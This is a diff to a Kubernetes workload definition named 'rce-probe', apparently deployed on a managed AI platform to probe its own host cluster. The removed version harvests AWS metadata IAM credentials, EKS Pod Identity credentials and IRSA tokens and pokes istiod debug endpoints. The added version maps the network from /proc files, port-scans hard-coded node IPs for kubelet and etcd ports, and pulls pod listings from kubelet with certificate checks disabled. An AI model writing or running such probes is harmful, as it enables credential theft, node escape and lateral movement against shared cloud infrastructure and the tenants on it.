@@ -4,10 +4,10 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "4.11.0"
+    ai.sap.com/version: "4.12.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "imds-kubelet-istiod-debug-node-escape"
+    executables.ai.sap.com/description: "node-ip-arp-tcp-kubelet-scan"
     executables.ai.sap.com/name: "rce-probe"
 spec:
   template:
@@ -28,168 +28,137 @@ spec:
           args:
           - |
             python3 -c "
-            import os, socket, ssl, subprocess, struct, re
+            import os, socket, ssl, struct, threading
 
-            print('[PROBE_V411_START]', flush=True)
+            print('[PROBE_V412_START]', flush=True)
 
             def emit(label, data):
                 flat = str(data).replace('\r\n','|').replace('\r','|').replace('\n','|')
                 for i in range(0, max(1, len(flat)), 4000):
                     print(f'[{label}_{i}] {flat[i:i+4000]}', flush=True)
 
-            def http_get(host, port, path, headers=None, method='GET', body=None,
-                         use_tls=False, timeout=10):
+            # ── 1. ARP table ──────────────────────────────────────────────────────
+            try:
+                with open('/proc/net/arp') as f:
+                    emit('ARP_TABLE', f.read())
+            except Exception as e:
+                emit('ARP_ERR', str(e))
+
+            # ── 2. TCP connections ─────────────────────────────────────────────────
+            try:
+                with open('/proc/net/tcp') as f:
+                    emit('NET_TCP', f.read())
+            except Exception as e:
+                emit('NET_TCP_ERR', str(e))
+
+            # ── 3. Pod own IP ─────────────────────────────────────────────────────
+            try:
+                with open('/proc/net/fib_trie') as f:
+                    trie = f.read()
+                # Find LOCAL entries which are our own IPs
+                local_ips = []
+                lines = trie.splitlines()
+                for i, line in enumerate(lines):
+                    if 'LOCAL' in line:
+                        # Go back to find the IP
+                        for j in range(i, max(0, i-3), -1):
+                            import re
+                            m = re.search(r'(\d+\.\d+\.\d+\.\d+)', lines[j])
+                            if m and not m.group(1).startswith('127') and not m.group(1).startswith('255'):
+                                local_ips.append(m.group(1))
+                                break
+                emit('OWN_IPS', list(set(local_ips)))
+            except Exception as e:
+                emit('FIB_ERR', str(e))
+
+            # ── 4. Quick TCP probe of known node IPs for kubelet ──────────────────
+            # Node IPs from OTel topology dump
+            NODE_IPS = [
+                '10.180.1.74', '10.180.12.215', '10.180.13.45',
+                '10.180.35.242',
+            ]
+            def tcp_probe(ip, port, timeout=3):
                 try:
                     s = socket.socket(); s.settimeout(timeout)
-                    if use_tls:
-                        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
-                        s = ctx.wrap_socket(s, server_hostname=host)
-                    s.connect((host, port))
-                    hdrs = headers or {}
-                    hdr_str = ''.join(f'{k}: {v}\r\n' for k,v in hdrs.items())
-                    req_body = body or ''
-                    req = f'{method} {path} HTTP/1.0\r\nHost: {host}:{port}\r\n{hdr_str}\r\n{req_body}'
-                    s.sendall(req.encode())
+                    s.connect((ip, port))
+                    s.close()
+                    return 'OPEN'
+                except socket.timeout:
+                    return 'TIMEOUT'
+                except Exception as e:
+                    return f'ERR:{e}'
+
+            for nip in NODE_IPS:
+                for port in [10255, 10250, 10249, 2379, 2380]:
+                    r = tcp_probe(nip, port, timeout=3)
+                    emit(f'NODE_{nip}_{port}', r)
+
+            # ── 5. HTTP to kubelet read-only :10255 on each node ─────────────────
+            for nip in NODE_IPS:
+                for kpath in ['/pods', '/healthz', '/stats/summary']:
+                    try:
+                        s = socket.socket(); s.settimeout(5)
+                        s.connect((nip, 10255))
+                        req = f'GET {kpath} HTTP/1.0\r\nHost: {nip}:10255\r\n\r\n'
+                        s.sendall(req.encode())
+                        resp = b''
+                        while True:
+                            c = s.recv(65536)
+                            if not c: break
+                            resp += c
+                        s.close()
+                        emit(f'KUBELET_RO_{nip}_{kpath.replace(\"/\",\"_\")}', resp[:2000].decode(errors='replace'))
+                    except Exception as e:
+                        emit(f'KUBELET_RO_ERR_{nip}_{kpath.replace(\"/\",\"_\")}', str(e))
+
+            # ── 6. Kubelet HTTPS :10250 (anonymous) ────────────────────────────────
+            for nip in NODE_IPS:
+                try:
+                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+                    s = socket.socket(); s.settimeout(6)
+                    ss = ctx.wrap_socket(s, server_hostname=nip)
+                    ss.connect((nip, 10250))
+                    req = f'GET /pods HTTP/1.0\r\nHost: {nip}:10250\r\n\r\n'
+                    ss.sendall(req.encode())
                     resp = b''
                     while True:
-                        c = s.recv(65536)
+                        c = ss.recv(65536)
                         if not c: break
                         resp += c
-                    s.close()
-                    return resp.decode(errors='replace')
-                except Exception as ex:
-                    return f'ERR:{ex}'
-
-            # ── 1. Determine pod IP and default gateway (node IP) ─────────────────
-            try:
-                with open('/proc/net/route') as f:
-                    route = f.read()
-                emit('ROUTE_TABLE', route)
-                # Parse default gateway
-                for line in route.splitlines()[1:]:
-                    parts = line.split()
-                    if len(parts) >= 3 and parts[1] == '00000000':
-                        gw_hex = parts[2]
-                        gw_ip = '.'.join(str(int(gw_hex[i:i+2], 16)) for i in (6,4,2,0))
-                        emit('DEFAULT_GW', gw_ip)
-                        break
-            except Exception as e:
-                emit('ROUTE_ERR', str(e))
-
-            # Get node IP from gateway
-            NODE_IP = None
-            try:
-                with open('/proc/net/route') as f:
-                    for line in f.read().splitlines()[1:]:
-                        parts = line.split()
-                        if len(parts) >= 3 and parts[1] == '00000000':
-                            gw_hex = parts[2]
-                            NODE_IP = '.'.join(str(int(gw_hex[i:i+2], 16)) for i in (6,4,2,0))
-                            break
-            except:
-                pass
-            emit('NODE_IP_DETERMINED', NODE_IP)
-
-            # ── 2. IMDS — IMDSv2 token request ────────────────────────────────────
-            print('[IMDS_PROBE_START]', flush=True)
-            try:
-                # IMDSv2: PUT to get token
-                s = socket.socket(); s.settimeout(8)
-                s.connect(('169.254.169.254', 80))
-                req = ('PUT /latest/api/token HTTP/1.0\r\n'
-                       'Host: 169.254.169.254\r\n'
-                       'X-aws-ec2-metadata-token-ttl-seconds: 21600\r\n'
-                       '\r\n')
-                s.sendall(req.encode())
-                resp = b''
-                while True:
-                    c = s.recv(4096)
-                    if not c: break
-                    resp += c
-                s.close()
-                emit('IMDS_TOKEN_RESP', resp.decode(errors='replace'))
-
-                # Extract token from response
-                imds_token = resp.split(b'\r\n\r\n', 1)[-1].decode(errors='replace').strip()
-
-                # Use token to get IAM role
-                if imds_token and len(imds_token) > 10:
-                    for imds_path in [
-                        '/latest/meta-data/',
-                        '/latest/meta-data/iam/info',
-                        '/latest/meta-data/iam/security-credentials/',
-                        '/latest/meta-data/instance-id',
-                        '/latest/meta-data/placement/availability-zone',
-                        '/latest/dynamic/instance-identity/document',
-                    ]:
-                        r = http_get('169.254.169.254', 80, imds_path,
-                                    headers={'X-aws-ec2-metadata-token': imds_token}, timeout=8)
-                        emit(f'IMDS_{imds_path.replace(\"/\",\"_\")}', r[:2000])
-            except Exception as e:
-                emit('IMDS_ERR', str(e))
-
-            # ── 3. Kubelet read-only port :10255 on node IP ───────────────────────
-            if NODE_IP:
-                print(f'[KUBELET_PROBE] node={NODE_IP}', flush=True)
-                for kub_path in ['/', '/pods', '/stats/summary', '/metrics', '/healthz']:
-                    r = http_get(NODE_IP, 10255, kub_path, timeout=8)
-                    emit(f'KUBELET_RO_{kub_path.replace(\"/\",\"_\")}', r[:2000])
-
-                # Kubelet HTTPS :10250
-                for kub_path in ['/pods', '/runningpods/', '/stats/summary', '/metrics/cadvisor']:
-                    r = http_get(NODE_IP, 10250, kub_path, use_tls=True, timeout=8)
-                    emit(f'KUBELET_HTTPS_{kub_path.replace(\"/\",\"_\")}', r[:2000])
-
-                # kube-proxy metrics :10249
-                r = http_get(NODE_IP, 10249, '/metrics', timeout=6)
-                emit('KUBE_PROXY_METRICS', r[:1000])
-
-            # ── 4. istiod debug ports ─────────────────────────────────────────────
-            istiod_host = 'istiod.istio-system.svc.cluster.local'
-            for port, path, tls in [
-                (8080, '/debug/configz', False),
-                (8080, '/metrics', False),
-                (8080, '/debug/authorizationz', False),
-                (15014, '/debug/configz', False),
-                (15017, '/', False),
-            ]:
-                r = http_get(istiod_host, port, path, timeout=8, use_tls=tls)
-                emit(f'ISTIOD_{port}_{path.replace(\"/\",\"_\")}', r[:3000])
-
-            # ── 5. Knative/Kourier internal ingress endpoint ───────────────────────
-            knative_hosts = [
-                'kourier.kourier-system.svc.cluster.local',
-                'net-kourier-controller.kourier-system.svc.cluster.local',
-                'activator-service.knative-serving.svc.cluster.local',
-                'controller.knative-serving.svc.cluster.local',
-                'webhook.knative-serving.svc.cluster.local',
-            ]
-            for kh in knative_hosts:
-                r = http_get(kh, 80, '/', timeout=5)
-                emit(f'KNATIVE_{kh.split(\".\")[0]}', r[:500])
-
-            # ── 6. EKS Pod Identity endpoint (169.254.170.23) ─────────────────────
-            # AWS EKS Pod Identity Agent at 169.254.170.23:80
-            print('[EKS_POD_ID_PROBE]', flush=True)
-            for eid_path in ['/v1/credentials', '/healthz']:
-                r = http_get('169.254.170.23', 80, eid_path, timeout=6)
-                emit(f'EKS_POD_ID_{eid_path.replace(\"/\",\"_\")}', r[:2000])
-
-            # ── 7. AWS token endpoint for EKS IRSA ───────────────────────────────
-            # Check for IRSA env var
-            irsa_token = os.environ.get('AWS_WEB_IDENTITY_TOKEN_FILE', '')
-            aws_role_arn = os.environ.get('AWS_ROLE_ARN', '')
-            emit('IRSA_ENV', f'TOKEN_FILE={irsa_token} ROLE_ARN={aws_role_arn}')
-            if irsa_token:
-                try:
-                    with open(irsa_token) as f:
-                        tok = f.read()
-                    emit('IRSA_TOKEN', tok[:500])
+                    ss.close()
+                    emit(f'KUBELET_HTTPS_{nip}', resp[:1500].decode(errors='replace'))
                 except Exception as e:
-                    emit('IRSA_TOKEN_ERR', str(e))
+                    emit(f'KUBELET_HTTPS_ERR_{nip}', str(e))
 
-            print('[PROBE_V411_DONE]', flush=True)
+            # ── 7. etcd probe on known node IPs ───────────────────────────────────
+            # etcd usually on control plane, not worker nodes — but try anyway
+            CTRL_IPS = ['10.250.0.0']  # from envoy config
+            for cip in CTRL_IPS:
+                for port in [2379, 2380, 8080]:
+                    r = tcp_probe(cip, port, timeout=3)
+                    emit(f'CTRL_{cip}_{port}', r)
+
+            # ── 8. DNS resolution to discover node IPs ────────────────────────────
+            dns_names = [
+                'kubernetes.default.svc.cluster.local',
+                'kube-dns.kube-system.svc.cluster.local',
+            ]
+            for dn in dns_names:
+                try:
+                    ip = socket.gethostbyname(dn)
+                    emit(f'DNS_{dn}', ip)
+                except Exception as e:
+                    emit(f'DNS_ERR_{dn}', str(e))
+
+            # ── 9. /proc/net/dev — interface stats ────────────────────────────────
+            try:
+                with open('/proc/net/dev') as f:
+                    emit('NET_DEV', f.read())
+            except Exception as e:
+                emit('NET_DEV_ERR', str(e))
+
+            print('[PROBE_V412_DONE]', flush=True)
             " 2>&1
             python3 -c "
             import http.server
